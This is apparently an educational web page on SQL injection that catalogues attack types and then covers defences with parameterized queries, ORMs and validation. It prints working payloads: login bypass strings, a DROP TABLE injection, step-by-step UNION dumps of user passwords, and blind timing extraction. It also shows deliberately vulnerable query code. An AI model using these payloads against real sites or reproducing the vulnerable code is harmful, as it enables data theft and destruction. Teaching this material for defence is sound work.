💀Classic / In-Band SQLiCRITICAL

The original — injecting OR 1=1, comment tricks, and UNION selects to bypass authentication or dump data directly.
🔗UNION-Based SQLiCRITICAL

Attach attacker-controlled SELECT statements to extract data from other tables like users, passwords, credit cards.
🔍Blind Boolean-BasedHIGH

No data is returned — but different true/false conditions change the page response. Slowly extract data bit by bit.
⏱Blind Time-BasedHIGH

Use SLEEP() or WAITFOR DELAY to cause the server to pause. A delay = true condition. Extract data via timing side-channel.
💥Error-Based SQLiHIGH

Force the database to throw informative errors that leak schema names, table names, and data in the error message.
📡Out-of-Band SQLiHIGH

Exfiltrate data via DNS or HTTP requests to an attacker-controlled server — useful when other channels are blocked.
💾Second-Order / Stored SQLiCRITICAL

Payload stored in DB, safe-looking on input. Executes later when another user/process retrieves and uses the data.
📚Stacked QueriesCRITICAL

Use ; to terminate the original query and inject a completely new one — can be used to DROP, UPDATE, or INSERT data.
📊ORDER BY InjectionMEDIUM

Injection into ORDER BY clauses can't use quotes — unique techniques required. Often overlooked by developers.
🔐Auth BypassCRITICAL

Classic ' OR '1'='1 and its variants. Bypass login as any user, including admin, without knowing any password.
💣Mass Data ExtractionCRITICAL

Combine UNION + information_schema to dump entire database structure and all table contents automatically.
🛡WAF Bypass TechniquesMEDIUM

Case variation, comments, URL encoding, whitespace alternatives to evade Web Application Firewalls and naive filters.

Classic In-Band SQLi

The most straightforward form — attacker can see results directly in the app response.

VULNERABLE PHP CODE
// VULNERABLE: Direct string concatenation $query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'"; // Input: admin' -- // Result: SELECT * FROM users WHERE username = 'admin' --' // The -- comments out the rest → no password check!
💀 Payload: admin' --  |  ' OR '1'='1' --  |  '; DROP TABLE users; --

UNION-Based Injection

Attach a second SELECT to extract data from any accessible table. Requires knowing column count.

1

Find column count

Inject ORDER BY 1--, ORDER BY 2--... until error. That number = column count.

2

Find printable columns

Inject UNION SELECT NULL,NULL,NULL-- then replace NULLs with 'a' to find string columns.

3

Extract data

Use UNION SELECT username,password,NULL FROM users-- to dump credentials.

4

Enumerate schema

Query information_schema.tables and information_schema.columns to map the whole database.

STEP-BY-STEP UNION ATTACK
-- Step 1: Find columns (try 1,2,3...) ORDER BY 3-- -- Step 2: Find string-capable columns UNION SELECT NULL,'a',NULL-- -- Step 3: Extract users table UNION SELECT username,password,email FROM users-- -- Step 4: Full schema dump UNION SELECT table_name,column_name,NULL FROM information_schema.columns--

Blind SQL Injection

No data in response — you infer info from behavior changes (true/false page differences or response time).

BOOLEAN-BASED BLIND
-- True condition (normal page) AND 1=1-- -- False condition (broken/empty page) AND 1=2-- -- Extract 1st char of DB name AND SUBSTRING(database(),1,1)='a'-- -- Binary search approach (faster) AND ASCII(SUBSTRING(database(),1,1))>77--
TIME-BASED BLIND (MySQL)
-- Delay 5 seconds if admin user exists AND (SELECT SLEEP(5) FROM users WHERE username='admin')-- -- MSSQL equivalent IF(1=1) WAITFOR DELAY '0:0:5'-- -- PostgreSQL equivalent AND 1=1; SELECT pg_sleep(5)-- -- Extract data via timing (char by char) AND IF(SUBSTRING(password,1,1)='p', SLEEP(5),0)--

🛡 Mitigation Techniques
Every defense method, ranked by effectiveness
✅ BEST DEFENSE: Parameterized queries / Prepared Statements

User input is NEVER concatenated into SQL. The DB treats it as data, not code — impossible to inject.

PHP — PDO (Best Practice)
// VULNERABLE ❌ $query = "SELECT * FROM users WHERE user='".$_POST['user']."'"; // SECURE ✅ — PDO Prepared Statement $stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username"); $stmt->bindParam(':username', $_POST['username'], PDO::PARAM_STR); $stmt->execute();
Python — Parameterized Query
# VULNERABLE ❌ cursor.execute(f"SELECT * FROM users WHERE user='{username}'") # SECURE ✅ cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
Java — PreparedStatement
// VULNERABLE ❌ stmt = conn.createStatement(); stmt.executeQuery("SELECT * FROM users WHERE user='"+user+"'"); // SECURE ✅ PreparedStatement ps = conn.prepareStatement( "SELECT * FROM users WHERE username = ?"); ps.setString(1, username); ps.executeQuery();
✅ ORMs abstract SQL entirely — injection nearly impossible with correct usage
Django ORM (Python)
# SAFE ✅ — ORM handles parameterization user = User.objects.get(username=request.POST['username']) # STILL VULNERABLE ❌ — using raw() incorrectly User.objects.raw(f"SELECT * FROM users WHERE username='{username}'")
Node.js — Sequelize ORM
// SAFE ✅ const user = await User.findOne({ where: { username } }); // VULNERABLE ❌ — literal injection const user = await sequelize.query( `SELECT * FROM users WHERE username = '${username}'` );
⚠ NOT SUFFICIENT ALONE — use as defense-in-depth alongside parameterized queries
Input Validation Techniques
// Whitelist approach (preferred) const allowedChars = /^[a-zA-Z0-9_@.]+$/; if (!allowedChars.test(username)) { throw "Invalid input"; } // Type enforcement const id = parseInt(req.params.id, 10); if (isNaN(id)) throw "ID must be integer"; // Length limits if (username.length > 50) throw "Too long"; // Escape as last resort (never primary defense!) username = username.replace(/'/g, "''");
ℹ Stored procedures add a layer but must still use parameterization internally
MySQL Stored Procedure (Safe)
-- Create safe stored procedure CREATE PROCEDURE GetUser(IN p_username VARCHAR(50)) BEGIN SELECT id, username, email FROM users WHERE username = p_username; -- parameterized! END; -- Call from PHP safely $stmt = $pdo->prepare("CALL GetUser(?)"); $stmt->execute([$username]);
